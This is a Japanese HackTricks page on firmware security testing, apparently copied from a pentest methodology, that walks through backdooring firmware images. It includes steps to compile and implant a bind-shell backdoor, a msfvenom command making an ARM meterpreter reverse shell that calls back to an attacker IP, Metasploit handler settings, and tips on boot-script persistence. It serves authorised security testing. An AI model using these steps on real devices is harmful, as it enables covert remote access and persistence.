<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- 独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションである[**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


### このページは[https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)からコピーされました。

**カスタムファームウェアやコンパイルされたバイナリをアップロード**して、整合性や署名の検証の欠陥を試みます。たとえば、次の手順を使用して、起動時に開始するバックドアバインドシェルをコンパイルします。

1. firmware-mod-kit（FMK）を使用してファームウェアを抽出します。
2. ターゲットのファームウェアアーキテクチャとエンディアンを特定します。
3. Buildrootを使用してクロスコンパイラをビルドするか、環境に合わせた他の方法を使用します。
4. クロスコンパイラを使用してバックドアをビルドします。
5. バックドアを抽出したファームウェアの/usr/binにコピーします。
6. 適切なQEMUバイナリを抽出したファームウェアのルートファイルシステムにコピーします。
7. chrootとQEMUを使用してバックドアをエミュレートします。
8. netcatを使用してバックドアに接続します。
9. 抽出したファームウェアのルートファイルシステムからQEMUバイナリを削除します。
10. FMKを使用して変更したファームウェアを再パッケージ化します。
11. ファームウェア解析ツールキット（FAT）を使用してバックドア付きのファームウェアをエミュレートし、netcatを使用してターゲットのバックドアIPとポートに接続してテストします。

既にダイナミック解析、ブートローダ操作、またはハードウェアセキュリティテスト手段からルートシェルを取得している場合は、インプラントやリバースシェルなどの事前にコンパイルされた悪意のあるバイナリを実行しようとします。コマンドアンドコントロール（C\&C）フレームワークに使用される自動ペイロード/インプラントツールの使用を検討してください。たとえば、Metasploitフレームワークと「msfvenom」を使用する場合は、次の手順を使用します。

1. ターゲットのファームウェアアーキテクチャとエンディアンを特定します。
2. `msfvenom`を使用して、適切なターゲットペイロード（-p）、攻撃者のホストIP（LHOST=）、リッスンポート番号（LPORT=）、ファイルタイプ（-f）、アーキテクチャ（--arch）、プラットフォーム（--platform linuxまたはwindows）、および出力ファイル（-o）を指定します。たとえば、`msfvenom -p linux/armle/meterpreter_reverse_tcp LHOST=192.168.1.245 LPORT=4445 -f elf -o meterpreter_reverse_tcp --arch armle --platform linux`
3. ペイロードを侵害されたデバイスに転送します（たとえば、ローカルウェブサーバーを実行し、ペイロードをファイルシステムにwget/curlします）およびペイロードに実行許可があることを確認します。
4. Metasploitを受信リクエストを処理するように準備します。たとえば、msfconsoleでMetasploitを起動し、次の設定を使用します（上記のペイロードに応じて）：use exploit/multi/handler、
* `set payload linux/armle/meterpreter_reverse_tcp`
* `set LHOST 192.168.1.245 #attacker host IP`
* `set LPORT 445 #can be any unused port`
* `set ExitOnSession false`
* `exploit -j -z`
5. 侵害されたデバイスでメータープリタリバース🐚を実行します。
6. メータープリターセッションが開かれるのを見守ります。
7. ポストエクスプロイト活動を実行します。

可能であれば、起動スクリプト内の脆弱性を特定して、デバイスが再起動しても持続的なアクセスを取得します。このような脆弱性は、起動スクリプトがSDカードやルートファイルシステム以外の信頼されていないマウントされた場所にあるコードを参照、[シンボリックリンク](https://www.chromium.org/chromium-os/chromiumos-design-docs/hardening-against-malicious-stateful-data)、または依存する場合に発生します。、ストレージデータ用のフラッシュボリュームなど。
